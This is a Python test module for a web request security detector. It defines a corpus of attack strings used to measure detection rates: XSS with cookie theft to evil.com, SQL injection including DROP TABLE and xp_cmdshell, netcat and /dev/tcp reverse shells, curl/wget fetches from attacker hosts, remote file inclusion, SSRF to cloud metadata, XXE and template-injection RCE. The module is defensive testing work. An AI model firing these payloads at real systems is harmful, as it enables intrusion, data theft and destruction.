import time
from typing import NamedTuple

import pytest

from guard_core.models import SecurityConfig
from guard_core.sync.handlers.suspatterns_handler import (
    ALL_DETECTION_CATEGORIES,
    SusPatternsManager,
)


class MaliciousCase(NamedTuple):
    case_id: str
    category: str
    payload: str
    detector: str = "production"
    known_gap_reason: str = ""


class BenignCase(NamedTuple):
    case_id: str
    payload: str
    detector: str = "production"
    known_false_positive_reason: str = ""


def _build_isolated_manager(config: SecurityConfig | None) -> SusPatternsManager:
    original_instance = SusPatternsManager._instance
    original_config = SusPatternsManager._config
    SusPatternsManager._instance = None
    SusPatternsManager._config = None
    manager = SusPatternsManager(config) if config else SusPatternsManager()
    SusPatternsManager._instance = original_instance
    SusPatternsManager._config = original_config
    return manager


_LEGACY_MANAGER = _build_isolated_manager(None)
_PRODUCTION_MANAGER = _build_isolated_manager(SecurityConfig())

_ENCODING_AWARE_MANAGER = _build_isolated_manager(SecurityConfig())
_ENCODING_AWARE_MANAGER._semantic_analyzer = None

_DETECTORS: dict[str, SusPatternsManager] = {
    "production": _PRODUCTION_MANAGER,
    "legacy": _LEGACY_MANAGER,
    "encoding_aware": _ENCODING_AWARE_MANAGER,
}

_LEGACY_SMOKE_DETECTORS: dict[str, SusPatternsManager] = {
    "production": _LEGACY_MANAGER,
    "legacy": _LEGACY_MANAGER,
    "encoding_aware": _ENCODING_AWARE_MANAGER,
}

_TRUNCATION_FILLER = (
    "The quarterly report summarizes engagement metrics across every region "
    "and highlights the onboarding funnel improvements shipped last sprint. "
) * 90

_EMBEDDED_PROSE_PROBE_KNOWN_GAP_REASON = (
    "a bare probe path embedded in a full prose sentence cannot be told apart "
    "from a benign prose sentence mentioning the same shape of path using "
    "structural pattern matching alone: word-bounding the path as an isolated "
    "token reproduces the false-positive shape defect 1 removed (34/41 benign "
    "prose-with-path strings false-positived when measured against this exact "
    "corpus), and gating on nearby attack-implying keywords instead is not a "
    "reliable discriminator (it misses the literal motivating case 'the "
    "scanner hit /wp-admin/install.php' because 'Note:' collides with the "
    "same vocabulary legitimate incident reports use, and a real attacker can "
    "phrase the identical probe without any alarming word). Measured against "
    "a 32-malicious/41-benign corpus built for this defect: 0/32 recall and "
    "0/41 FP unmodified; bare-token matching reaches 31/32 recall but 34/41 "
    "FP; keyword co-occurrence reaches 0/41 FP but only 28/32 recall and "
    "misses the headline example. Neither candidate clears both gates, so "
    "this stays a documented, measured gap"
)

_SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON = (
    "a quoted absolute-path or env-prefixed shell invocation after a "
    "semicolon is character-identical to the attack shape the widened "
    "cmd_injection shell pattern must catch; the surface is symmetric with "
    "the bare-shell form that fired in every released version, and "
    "separating a quoted invocation from a real one requires contextual "
    "evaluation, not regex shape"
)

_SEMICOLON_BARE_SHELL_CONTROL_KNOWN_FP_REASON = (
    "the bare-shell form of this prose shape fired in every released "
    "version before the absolute-path and env-prefixed widening; pinned as "
    "the control case the new pins are symmetric with"
)

_WHOLE_VALUE_SHELL_INVOCATION_KNOWN_FP_REASON = (
    "a field whose entire value is an absolute-path or env-prefixed shell "
    "invocation spec, the Docker/K8s command or entrypoint override shape, "
    "is character-identical to the attack shape the widened cmd_injection "
    "shell pattern must catch; the surface is symmetric with the bare-shell "
    "form that fired in every released version, and an API that "
    "legitimately carries command specs needs route-level configuration, "
    "not a narrower pattern"
)

_WHOLE_VALUE_BARE_SHELL_CONTROL_KNOWN_FP_REASON = (
    "the bare-shell form of this whole-value shape fired in every released "
    "version before the absolute-path and env-prefixed widening; pinned as "
    "the control case the new pins are symmetric with"
)

_RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON = (
    "the dedicated RFI file_inclusion pattern flags any param-value "
    "delivery of an explicit http(s)/ftp URL whose final path segment ends "
    "in one of the RFI executable/includable target extensions; a genuine "
    "raw-doc download link (README.txt, readme.txt, terms.txt) and a "
    "genuine curl-pipe installer or legacy cgi-bin link (install.sh, "
    "search.cgi) are character-identical to that param=scheme://host/"
    "path.ext RFI payload shape and cannot be told apart by extension "
    "alone; an app that legitimately serves such download or installer "
    "links needs route-level allowlisting, not a narrower pattern that "
    "would lose recall on the backdoor.txt/backdoor.pl-shaped payloads "
    "this pattern was built to catch"
)

_SSTI_CALL_OR_FILTER_SYNTAX_KNOWN_FP_REASON = (
    "the shape-gated {{ }}/#{ } template patterns flag any request-value "
    "delivery of a double-curly or hash-brace expression containing a bare "
    "function-call shape (a word immediately followed by parentheses); a "
    "genuine template's own filter or method call syntax (format(x), a "
    "Jinja round(2) filter, a Ruby helper.format(value) call, a JS-style "
    ".map(item => ...) arrow callback) is character-identical to that "
    "call-branch SSTI shape and cannot be told apart by structure alone; "
    "an app that legitimately accepts raw template source as a request "
    "value needs route-level allowlisting, not a narrower pattern that "
    "would lose recall on the {{config.items()}}/#{T(...).exec(...)} "
    "RCE shape this gate was built to catch"
)

_SSTI_DATE_IN_BRACES_KNOWN_FP_REASON = (
    "the quote-tolerant arithmetic branch of the {{ }}/#{ } shape gate "
    "matches any digit-operator-digit run, and a hyphen-delimited date "
    "embedded in braces ({{ 2024-01-02 }}, #{2024-12-31}) parses as "
    "digit-minus-digit subtraction; a genuine date-in-braces value is "
    "character-identical to that arithmetic SSTI shape and cannot be told "
    "apart by structure alone; an app that legitimately delivers dates "
    "inside template-looking braces needs route-level allowlisting, not a "
    "narrower pattern that would lose recall on the {{7*7}}/{{7*'7'}} "
    "arithmetic-probe shape this branch was built to catch"
)

MALICIOUS_CORPUS: list[MaliciousCase] = [
    MaliciousCase("xss_basic_script_alert", "xss", "<script>alert(1)</script>"),
    MaliciousCase(
        "xss_cookie_exfil",
        "xss",
        "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
    ),
    MaliciousCase(
        "xss_javascript_protocol", "xss", "javascript:alert(document.cookie)"
    ),
    MaliciousCase("xss_img_onerror", "xss", "<img src=x onerror=alert(1)>"),
    MaliciousCase("xss_body_onload", "xss", "<body onload=alert(1)>"),
    MaliciousCase(
        "xss_anchor_href_javascript", "xss", '<a href="javascript:alert(1)">click</a>'
    ),
    MaliciousCase(
        "xss_style_url_expression",
        "xss",
        '<div style="background:url(javascript:alert(1))">',
    ),
    MaliciousCase("xss_object_tag", "xss", '<object data="evil.html">payload</object>'),
    MaliciousCase("xss_svg_onload", "xss", "<svg onload=alert(1)>"),
    MaliciousCase("xss_embed_tag", "xss", "<embed src=evil.swf>malicious</embed>"),
    MaliciousCase(
        "xss_base64_wrapped_script_alert",
        "xss",
        "PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+",
        "encoding_aware",
    ),
    MaliciousCase(
        "xss_past_truncation_cutoff_script_alert",
        "xss",
        _TRUNCATION_FILLER + "<script>alert(document.cookie)</script>",
        "encoding_aware",
    ),
    MaliciousCase(
        "xss_base64_wrapped_script_alert_with_cyrillic_suffix",
        "xss",
        "PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+"
        "0JDQkdCS0JPQlNCV0JbQl9CY0Jk=",
        "encoding_aware",
    ),
    MaliciousCase(
        "xss_base64_wrapped_script_alert_with_invalid_utf8_byte",
        "xss",
        "PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+gA==",
        "encoding_aware",
    ),
    MaliciousCase(
        "sqli_select_where_password", "sqli", "SELECT password FROM users WHERE id=1"
    ),
    MaliciousCase("sqli_select_star", "sqli", "SELECT * FROM accounts"),
    MaliciousCase("sqli_union_select_null", "sqli", "' UNION SELECT NULL,NULL,NULL--"),
    MaliciousCase("sqli_or_tautology", "sqli", "1' OR '1'='1"),
    MaliciousCase("sqli_trailing_comment_dashdash", "sqli", "admin'--"),
    MaliciousCase("sqli_stacked_drop_table", "sqli", "1'; DROP TABLE users;--"),
    MaliciousCase("sqli_stacked_create_table", "sqli", "1; CREATE TABLE evil (a int)"),
    MaliciousCase("sqli_stacked_insert_into", "sqli", "1; INSERT INTO logs VALUES(1)"),
    MaliciousCase("sqli_stacked_update_set", "sqli", "1; UPDATE users SET admin=1"),
    MaliciousCase("sqli_stacked_delete_from", "sqli", "1; DELETE FROM sessions"),
    MaliciousCase("sqli_stacked_select_from", "sqli", "1; SELECT name FROM users"),
    MaliciousCase("sqli_stacked_replace_into", "sqli", "1; REPLACE INTO t VALUES(1)"),
    MaliciousCase("sqli_exec_xp_cmdshell", "sqli", "1; EXEC xp_cmdshell('whoami')"),
    MaliciousCase("sqli_exec_sp_configure", "sqli", "1; EXECUTE sp_configure"),
    MaliciousCase("sqli_time_based_sleep", "sqli", "id=5 AND SLEEP(5)"),
    MaliciousCase(
        "sqli_benchmark_blind", "sqli", "id=1 AND BENCHMARK(5000000,MD5('A'))"
    ),
    MaliciousCase(
        "sqli_load_file_read", "sqli", "id=1 UNION SELECT LOAD_FILE('/etc/passwd')"
    ),
    MaliciousCase("sqli_mysql_version_comment", "sqli", "1' /*!50000OR*/ '1'='1"),
    MaliciousCase("sqli_outfile_write", "sqli", "SELECT 'x' INTO OUTFILE '/tmp/x.php'"),
    MaliciousCase("sqli_order_by_enum", "sqli", "1' ORDER BY 1--"),
    MaliciousCase(
        "sqli_base64_wrapped_select_where",
        "sqli",
        "U0VMRUNUIHBhc3N3b3JkIEZST00gdXNlcnMgV0hFUkUgaWQ9MQ==",
        "encoding_aware",
    ),
    MaliciousCase("sqli_order_by_string_end_no_comment", "sqli", "1' ORDER BY 3"),
    MaliciousCase("sqli_hash_comment_string_end", "sqli", "admin'#"),
    MaliciousCase(
        "sqli_embedded_trailing_hash_comment",
        "sqli",
        "comment='malicious'#\nrest of json continues after",
    ),
    MaliciousCase(
        "sqli_standalone_hash_comment_control", "sqli", "comment='malicious'#"
    ),
    MaliciousCase(
        "sqli_embedded_order_by_with_trailing_header",
        "sqli",
        "sort=ORDER BY 1\nX-Extra-Header: value",
    ),
    MaliciousCase("sqli_standalone_order_by_control", "sqli", "ORDER BY 1"),
    MaliciousCase(
        "dir_traversal_double_dotdot_slash", "dir_traversal", "../../../../etc/passwd"
    ),
    MaliciousCase(
        "dir_traversal_windows_backslash",
        "dir_traversal",
        "..\\..\\..\\..\\windows\\win.ini",
    ),
    MaliciousCase(
        "dir_traversal_etc_passwd_suffix", "dir_traversal", "uploads/../../etc/passwd"
    ),
    MaliciousCase(
        "dir_traversal_etc_shadow_suffix", "dir_traversal", "files/../../etc/shadow"
    ),
    MaliciousCase(
        "dir_traversal_boot_ini_suffix", "dir_traversal", "download?file=../../boot.ini"
    ),
    MaliciousCase(
        "dir_traversal_proc_self_environ",
        "dir_traversal",
        "logs/../../proc/self/environ",
    ),
    MaliciousCase(
        "dir_traversal_regression7_etc_passwd_bare", "dir_traversal", "/etc/passwd"
    ),
    MaliciousCase(
        "dir_traversal_regression7_relative_etc_shadow",
        "dir_traversal",
        "../../etc/shadow",
    ),
    MaliciousCase(
        "path_traversal_encoded_dotdot", "path_traversal", "%2e%2e/%2e%2e/etc/passwd"
    ),
    MaliciousCase(
        "path_traversal_double_encoded_dotdot",
        "path_traversal",
        "%252e%252e/%252e%252e/etc/passwd",
    ),
    MaliciousCase(
        "path_traversal_unicode_fullwidth_dot",
        "path_traversal",
        "%uff0e%uff0e/etc/passwd",
    ),
    MaliciousCase(
        "path_traversal_overlong_utf8_dot", "path_traversal", "%c0%ae%c0%ae/etc/passwd"
    ),
    MaliciousCase(
        "path_traversal_double_url_encoded_slash",
        "path_traversal",
        "%25c0%25ae/etc/passwd",
    ),
    MaliciousCase("cmd_bare_backtick_whoami", "cmd_injection", "`whoami`"),
    MaliciousCase("cmd_bare_backtick_id", "cmd_injection", "`id`"),
    MaliciousCase(
        "cmd_separator_semicolon_cat_flag", "cmd_injection", "; cat -la /etc/passwd"
    ),
    MaliciousCase("cmd_pipe_wget", "cmd_injection", "| wget http://evil.example/x"),
    MaliciousCase("cmd_separator_dollar_paren", "cmd_injection", "; $(whoami)"),
    MaliciousCase(
        "cmd_separator_dollar_brace", "cmd_injection", "| ${IFS}cat${IFS}/etc/passwd"
    ),
    MaliciousCase("cmd_shell_dash_c", "cmd_injection", "; bash -c id"),
    MaliciousCase(
        "cmd_eval_call",
        "cmd_injection",
        "eval(\"require('child_process').exec('id')\")",
    ),
    MaliciousCase("cmd_separator_pipe_id", "cmd_injection", "|id"),
    MaliciousCase(
        "cmd_netcat_reverse_shell", "cmd_injection", "nc -e /bin/sh 10.0.0.1 4444"
    ),
    MaliciousCase(
        "cmd_dev_tcp_reverse_shell", "cmd_injection", "/dev/tcp/10.0.0.1/4444"
    ),
    MaliciousCase("cmd_chained_semicolon_id_whoami", "cmd_injection", "`id`; `whoami`"),
    MaliciousCase("cmd_separator_ampersand_reboot", "cmd_injection", "& `reboot`"),
    MaliciousCase(
        "cmd_double_pipe_curl", "cmd_injection", "|| curl http://evil.example/x"
    ),
    MaliciousCase(
        "cmd_separator_semicolon_nc",
        "cmd_injection",
        "; nc -e /bin/sh 10.0.0.1 4444",
    ),
    MaliciousCase(
        "cmd_base64_wrapped_reverse_shell",
        "cmd_injection",
        "fCBuYyAtZSAvYmluL3NoIDEwLjAuMC4xIDQ0NDQ=",
        "encoding_aware",
    ),
    MaliciousCase(
        "cmd_base64_wrapped_query_param",
        "cmd_injection",
        "payload=fCBuYyAtZSAvYmluL3NoIDEwLjAuMC4xIDQ0NDQ=",
        "encoding_aware",
    ),
    MaliciousCase(
        "cmd_past_truncation_cutoff_semicolon_cat",
        "cmd_injection",
        _TRUNCATION_FILLER + "; cat /etc/passwd",
        "encoding_aware",
    ),
    MaliciousCase(
        "cmd_past_truncation_cutoff_backtick_whoami",
        "cmd_injection",
        _TRUNCATION_FILLER + "`whoami`",
        "encoding_aware",
        "truncate_safely keeps roughly 100 chars of surrounding filler "
        "context around a preserved attack region, which breaks the backtick "
        "pattern's whole-string \\A...\\Z anchor even though the payload "
        "itself survives truncation",
    ),
    MaliciousCase("cmd_shell_dash_c_at_string_start", "cmd_injection", "sh -c id"),
    MaliciousCase(
        "cmd_injection_embedded_in_description_field",
        "cmd_injection",
        "some description field\nbash -c 'rm -rf /'",
    ),
    MaliciousCase(
        "cmd_injection_standalone_bash_rm_rf_control",
        "cmd_injection",
        "bash -c 'rm -rf /'",
    ),
    MaliciousCase("cmd_absolute_path_shell_dash_c", "cmd_injection", "/bin/sh -c id"),
    MaliciousCase("cmd_env_prefixed_shell_dash_c", "cmd_injection", "env bash -c id"),
    MaliciousCase(
        "cmd_injection_base64_hex_safe_evasion_netcat",
        "cmd_injection",
        "aCA5aCA0fE5De0A0aCA6",
        "encoding_aware",
    ),
    MaliciousCase(
        "file_inclusion_php_wrapper",
        "file_inclusion",
        "php://filter/convert.base64-encode/resource=index.php",
    ),
    MaliciousCase(
        "file_inclusion_data_wrapper",
        "file_inclusion",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOw==",
    ),
    MaliciousCase("file_inclusion_expect_wrapper", "file_inclusion", "expect://id"),
    MaliciousCase(
        "file_inclusion_zip_wrapper",
        "file_inclusion",
        "zip://shell.jpg%23payload.php",
    ),
    MaliciousCase(
        "file_inclusion_phar_wrapper",
        "file_inclusion",
        "phar://upload/shell.phar/payload.txt",
    ),
    MaliciousCase(
        "file_inclusion_protocol_relative_bare",
        "file_inclusion",
        "//evil.com/shell.txt",
    ),
    MaliciousCase(
        "file_inclusion_protocol_relative_param",
        "file_inclusion",
        "?file=//evil.com/x.txt",
    ),
    MaliciousCase(
        "file_inclusion_protocol_relative_src",
        "file_inclusion",
        "src=//evil.io/malicious.js",
    ),
    MaliciousCase(
        "file_inclusion_rfi_http_domain_shell_php",
        "file_inclusion",
        "?page=http://attacker.com/shell.php",
    ),
    MaliciousCase(
        "file_inclusion_rfi_https_domain_backdoor_txt",
        "file_inclusion",
        "?file=https://evil.example/backdoor.txt",
    ),
    MaliciousCase(
        "file_inclusion_rfi_ftp_domain_inc_phtml",
        "file_inclusion",
        "?template=ftp://evil/inc.phtml",
    ),
    MaliciousCase(
        "file_inclusion_rfi_http_ipv4_query_string",
        "file_inclusion",
        "?include=http://198.51.100.7/c99.php?cmd=id",
    ),
    MaliciousCase(
        "file_inclusion_rfi_https_domain_shell_asp",
        "file_inclusion",
        "?page=https://evil.example.com/shell.asp",
    ),
    MaliciousCase(
        "file_inclusion_rfi_http_domain_webshell_jsp",
        "file_inclusion",
        "?file=http://malicious-host.example/webshell.jsp",
    ),
    MaliciousCase(
        "file_inclusion_rfi_http_domain_backdoor_pl",
        "file_inclusion",
        "?exec=http://attacker.net/backdoor.pl",
    ),
    MaliciousCase(
        "file_inclusion_rfi_https_domain_payload_phar",
        "file_inclusion",
        "?load=https://evil.io/payload.phar",
    ),
    MaliciousCase("ldap_wildcard_or_filter", "ldap", "(|(uid=*)(cn=*))"),
    MaliciousCase("ldap_wildcard_equals", "ldap", "cn=*)(uid=*"),
    MaliciousCase("ldap_and_filter_injection", "ldap", "(&(objectClass=user)(uid=*))"),
    MaliciousCase("ldap_bare_or_paren", "ldap", "admin)(|(password=*"),
    MaliciousCase("ldap_wildcard_password_bypass", "ldap", "*)(password=*)"),
    MaliciousCase("ldap_nested_filter_bypass", "ldap", "(|(&"),
    MaliciousCase("ldap_double_paren_wildcard_breakout", "ldap", "*)((objectClass=*"),
    MaliciousCase("ldap_null_byte_truncation_breakout", "ldap", "*))%00"),
    MaliciousCase(
        "xml_external_entity_file",
        "xml",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
    ),
    MaliciousCase(
        "xml_external_entity_http",
        "xml",
        '<!ENTITY xxe SYSTEM "http://evil.example/xxe">',
    ),
    MaliciousCase(
        "xml_cdata_script_wrapper", "xml", "<![CDATA[<script>alert(1)</script>]]>"
    ),
    MaliciousCase(
        "xml_declaration_with_entity",
        "xml",
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/shadow">]>',
    ),
    MaliciousCase(
        "ssrf_aws_metadata_ip", "ssrf", "http://169.254.169.254/latest/meta-data/"
    ),
    MaliciousCase("ssrf_localhost_admin", "ssrf", "http://localhost:8080/admin"),
    MaliciousCase("ssrf_private_class_c", "ssrf", "http://192.168.1.1/admin"),
    MaliciousCase("ssrf_private_class_a", "ssrf", "http://10.0.0.1/admin"),
    MaliciousCase(
        "ssrf_gcp_metadata_internal",
        "ssrf",
        "http://metadata.google.internal/computeMetadata/v1/",
    ),
    MaliciousCase("ssrf_decimal_encoded_loopback", "ssrf", "http://2130706433/"),
    MaliciousCase("ssrf_octal_encoded_loopback", "ssrf", "http://0177.0.0.1/"),
    MaliciousCase("ssrf_hex_encoded_loopback", "ssrf", "http://0x7f000001/"),
    MaliciousCase("ssrf_hex_dotted_private_192", "ssrf", "http://0xC0.0xA8.1.1/"),
    MaliciousCase("ssrf_file_wrapper", "ssrf", "file:///etc/passwd"),
    MaliciousCase("ssrf_gopher_wrapper", "ssrf", "gopher://127.0.0.1:6379/_INFO"),
    MaliciousCase("ssrf_dict_wrapper", "ssrf", "dict://127.0.0.1:11211/stat"),
    MaliciousCase(
        "ssrf_alibaba_metadata", "ssrf", "http://100.100.100.200/latest/meta-data/"
    ),
    MaliciousCase("ssrf_unspecified_with_port", "ssrf", "reset via 0.0.0.0:9999 first"),
    MaliciousCase(
        "ssrf_regression2_bare_aws_metadata", "ssrf", "http://169.254.169.254/"
    ),
    MaliciousCase("ssrf_regression2_bare_loopback", "ssrf", "http://127.0.0.1/"),
    MaliciousCase(
        "ssrf_regression2_bare_localhost_port", "ssrf", "http://localhost:8080/"
    ),
    MaliciousCase("ssrf_regression2_bare_private_class_a", "ssrf", "http://10.0.0.5/"),
    MaliciousCase(
        "ssrf_regression2_bare_private_class_c", "ssrf", "http://192.168.1.1/"
    ),
    MaliciousCase("ssrf_regression2_bare_ipv6_loopback", "ssrf", "http://[::1]/"),
    MaliciousCase("ssrf_regression9_bare_zero_host", "ssrf", "http://0/"),
    MaliciousCase("ssrf_regression9_zero_host_with_port", "ssrf", "http://0:8080/"),
    MaliciousCase(
        "ssrf_base64_wrapped_metadata_url",
        "ssrf",
        "aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhLw==",
        "encoding_aware",
    ),
    MaliciousCase(
        "ssrf_past_truncation_cutoff_metadata",
        "ssrf",
        _TRUNCATION_FILLER + "http://169.254.169.254/latest/meta-data/",
        "encoding_aware",
    ),
    MaliciousCase("nosql_gt_operator_quoted", "nosql", '{"$gt":""}'),
    MaliciousCase("nosql_ne_operator_quoted", "nosql", '{"$ne":null}'),
    MaliciousCase(
        "nosql_where_operator_object",
        "nosql",
        '{"$where": "this.password.length > 0"}',
    ),
    MaliciousCase(
        "nosql_regex_operator", "nosql", '{"username": {"$regex": "^admin"}}'
    ),
    MaliciousCase(
        "nosql_in_operator_array", "nosql", '{"role": {"$in": ["admin","root"]}}'
    ),
    MaliciousCase("nosql_exists_operator", "nosql", '{"$exists": true}'),
    MaliciousCase("nosql_ne_operator_bracket_key", "nosql", "username[$ne]=admin"),
    MaliciousCase("nosql_gt_operator_bracket_key", "nosql", "filter[$gt]=100"),
    MaliciousCase("nosql_regex_operator_bracket_key", "nosql", "search[$regex]=.*"),
    MaliciousCase("nosql_where_operator_bracket_key", "nosql", "x[$where]=sleep(1)"),
    MaliciousCase("file_upload_php_extension", "file_upload", 'filename="shell.php"'),
    MaliciousCase(
        "file_upload_phtml_extension", "file_upload", 'filename="shell.phtml"'
    ),
    MaliciousCase(
        "file_upload_jsp_extension", "file_upload", 'filename="webshell.jsp"'
    ),
    MaliciousCase(
        "file_upload_double_extension_phar", "file_upload", "filename='avatar.phar'"
    ),
    MaliciousCase("file_upload_asp_extension", "file_upload", 'filename="cmd.asp"'),
    MaliciousCase(
        "file_upload_exe_extension", "file_upload", 'filename="installer.exe"'
    ),
    MaliciousCase(
        "file_upload_double_extension_php_jpg",
        "file_upload",
        'filename="shell.php.jpg"',
    ),
    MaliciousCase(
        "file_upload_double_extension_asp_png",
        "file_upload",
        'filename="malware.asp.png"',
    ),
    MaliciousCase(
        "file_upload_null_byte_percent_encoded",
        "file_upload",
        'filename="shell.php%00.jpg"',
    ),
    MaliciousCase(
        "file_upload_null_byte_raw_0x00",
        "file_upload",
        'filename="shell.php\x00.jpg"',
    ),
    MaliciousCase(
        "file_upload_null_byte_short_escape",
        "file_upload",
        'filename="shell.php\\0.jpg"',
    ),
    MaliciousCase("file_upload_pht_extension", "file_upload", 'filename="shell.pht"'),
    MaliciousCase(
        "file_upload_double_extension_pht_jpg",
        "file_upload",
        'filename="shell.pht.jpg"',
    ),
    MaliciousCase(
        "file_upload_jspx_extension", "file_upload", 'filename="webshell.jspx"'
    ),
    MaliciousCase(
        "file_upload_shtml_extension", "file_upload", 'filename="shell.shtml"'
    ),
    MaliciousCase("file_upload_ashx_extension", "file_upload", 'filename="shell.ashx"'),
    MaliciousCase("file_upload_asa_extension", "file_upload", 'filename="shell.asa"'),
    MaliciousCase("file_upload_asax_extension", "file_upload", 'filename="shell.asax"'),
    MaliciousCase("file_upload_ascx_extension", "file_upload", 'filename="shell.ascx"'),
    MaliciousCase("file_upload_cfm_extension", "file_upload", 'filename="shell.cfm"'),
    MaliciousCase("file_upload_cfc_extension", "file_upload", 'filename="shell.cfc"'),
    MaliciousCase("file_upload_war_extension", "file_upload", 'filename="shell.war"'),
    MaliciousCase(
        "template_double_curly_system",
        "template",
        "{{ config.__class__.__init__.__globals__.os.system }}",
    ),
    MaliciousCase(
        "template_percent_curly_exec",
        "template",
        "{% self.__init__.__globals__.__builtins__.exec %}",
    ),
    MaliciousCase(
        "template_erb_runtime_exec",
        "template",
        "<%= Runtime.getRuntime().exec('id') %>",
    ),
    MaliciousCase(
        "template_ognl_el_injection",
        "template",
        "${@java.lang.Runtime@getRuntime().exec('id')}",
    ),
    MaliciousCase("template_dollar_brace_arithmetic", "template", "${7*7}"),
    MaliciousCase(
        "template_erb_file_read", "template", "<%= File.read('/etc/passwd') %>"
    ),
    MaliciousCase(
        "http_split_crlf_location",
        "http_split",
        "search=x\r\nLocation: http://evil.example",
    ),
    MaliciousCase(
        "http_split_crlf_set_cookie",
        "http_split",
        "id=1\r\nSet-Cookie: session=hijacked",
    ),
    MaliciousCase(
        "http_split_crlf_http_response", "http_split", "name=x\r\nHTTP/1.1 200 OK"
    ),
    MaliciousCase(
        "http_split_newline_only_location",
        "http_split",
        "value\nLocation: http://evil.example",
    ),
    MaliciousCase("sensitive_file_dotenv_root", "sensitive_file", "/.env"),
    MaliciousCase("sensitive_file_dotenv_local", "sensitive_file", "/.env.local"),
    MaliciousCase("sensitive_file_config_yml", "sensitive_file", "/app-config.yml"),
    MaliciousCase(
        "sensitive_file_sourcemap", "sensitive_file", "/static/bundle.js.map"
    ),
    MaliciousCase("sensitive_file_python_source", "sensitive_file", "/app/settings.py"),
    MaliciousCase("sensitive_file_git_dir", "sensitive_file", "/.git/config"),
    MaliciousCase(
        "sensitive_file_regression7_var_www_dotenv",
        "sensitive_file",
        "/var/www/.env",
    ),
    MaliciousCase(
        "sensitive_file_regression7_app_git_config_standalone",
        "sensitive_file",
        "/app/.git/config",
    ),
    MaliciousCase("cms_probing_wp_admin", "cms_probing", "/wp-admin/"),
    MaliciousCase("cms_probing_wp_login", "cms_probing", "/wp-login.php"),
    MaliciousCase("cms_probing_xmlrpc", "cms_probing", "/xmlrpc.php"),
    MaliciousCase("cms_probing_phpinfo", "cms_probing", "/phpinfo.php"),
    MaliciousCase("cms_probing_backup_extension", "cms_probing", "/site.bak"),
    MaliciousCase("cms_probing_htpasswd", "cms_probing", "/.htpasswd"),
    MaliciousCase(
        "cms_probing_wp_admin_nested_path",
        "cms_probing",
        "/blog/wp-admin/setup.php",
    ),
    MaliciousCase("cms_probing_phpinfo_with_query", "cms_probing", "/info.php?x=1"),
    MaliciousCase(
        "cms_probing_embedded_wp_admin_setup_config_in_sentence",
        "cms_probing",
        "Redirecting to http://example.com/wp-admin/setup-config.php now",
        "production",
        "a scheme-embedded URL inside prose is structurally identical to a "
        "support ticket or changelog quoting the same URL (2 of 2 measured "
        "benign quoting cases false-positived when this alternative existed), "
        "so the scheme-embedded alternative was removed from the cms_probing "
        "pattern; only a standalone path still matches",
    ),
    MaliciousCase(
        "cms_probing_standalone_wp_admin_setup_config_control",
        "cms_probing",
        "/wp-admin/setup-config.php",
    ),
    MaliciousCase("recon_actuator_probe", "recon", "/actuator/health"),
    MaliciousCase("recon_server_status", "recon", "/server-status"),
    MaliciousCase("recon_cgi_bin_probe", "recon", "/cgi-bin/test.cgi"),
    MaliciousCase("recon_appsettings_json", "recon", "/appsettings.json"),
    MaliciousCase("recon_pom_xml", "recon", "/pom.xml"),
    MaliciousCase("recon_readme_md", "recon", "/README.md"),
    MaliciousCase("recon_git_head", "recon", "/.git/HEAD"),
    MaliciousCase("recon_owa_probe", "recon", "/owa/auth/logon.aspx"),
    MaliciousCase(
        "recon_actuator_nested_with_query",
        "recon",
        "/api/actuator/health?trace=1",
    ),
    MaliciousCase("recon_git_refs_nested_path", "recon", "/repo/.git/refs/heads/main"),
    MaliciousCase(
        "recon_docker_compose_nested_with_query",
        "recon",
        "/infra/docker-compose.yml?raw=1",
    ),
    MaliciousCase("recon_secrets_nested_path", "recon", "/config/app-secrets.yml"),
    MaliciousCase("recon_management_top_level_control", "recon", "/management"),
    MaliciousCase(
        "recon_management_nested_under_app", "recon", "/app/management/health"
    ),
    MaliciousCase(
        "recon_system_and_version_both_nested", "recon", "/v2/system/version"
    ),
    MaliciousCase("recon_management_nested_under_api", "recon", "/api/management"),
    MaliciousCase(
        "recon_credentials_nested_under_service", "recon", "/service/credentials"
    ),
    MaliciousCase(
        "recon_config_dump_nested_under_backend", "recon", "/backend/config_dump"
    ),
    MaliciousCase("recon_actuator_env_probe", "recon", "/actuator/env"),
    MaliciousCase("recon_config_dump_top_level", "recon", "/config_dump"),
    MaliciousCase("recon_bare_version_top_level", "recon", "/version"),
    MaliciousCase("recon_bare_system_top_level", "recon", "/system"),
    MaliciousCase(
        "proto_pollution_isadmin_key",
        "proto_pollution",
        '{"__proto__":{"isAdmin":true}}',
    ),
    MaliciousCase(
        "proto_pollution_constructor_prototype",
        "proto_pollution",
        'constructor["prototype"]["polluted"]=true',
    ),
    MaliciousCase(
        "proto_pollution_prototype_dot_access",
        "proto_pollution",
        "constructor.prototype.polluted = true",
    ),
    MaliciousCase(
        "proto_pollution_proto_bracket_key",
        "proto_pollution",
        '{"__proto__" : {"role":"admin"}}',
    ),
    MaliciousCase(
        "proto_pollution_base64_wrapped_isadmin",
        "proto_pollution",
        "eyJfX3Byb3RvX18iOnsiaXNBZG1pbiI6dHJ1ZX19",
        "encoding_aware",
    ),
    MaliciousCase(
        "proto_pollution_bracket_arbitrary_key",
        "proto_pollution",
        "__proto__[isAdmin]=true",
    ),
    MaliciousCase(
        "proto_pollution_constructor_bracket_prototype_unquoted",
        "proto_pollution",
        "constructor[prototype][isAdmin]=true",
    ),
    MaliciousCase(
        "proto_pollution_dot_arbitrary_key",
        "proto_pollution",
        "__proto__.polluted=1",
    ),
    MaliciousCase(
        "code_injection_process_start",
        "code_injection",
        'System.Diagnostics.Process.Start("cmd.exe","/c whoami")',
    ),
    MaliciousCase(
        "code_injection_reflection_namespace",
        "code_injection",
        "System.Reflection.Assembly.GetExecutingAssembly()",
    ),
    MaliciousCase(
        "code_injection_assembly_load",
        "code_injection",
        "Assembly.Load(maliciousBytes)",
    ),
    MaliciousCase(
        "cms_probing_embedded_prose_scanner_hit_install_php",
        "cms_probing",
        "Note: the scanner hit /wp-admin/install.php on our staging host.",
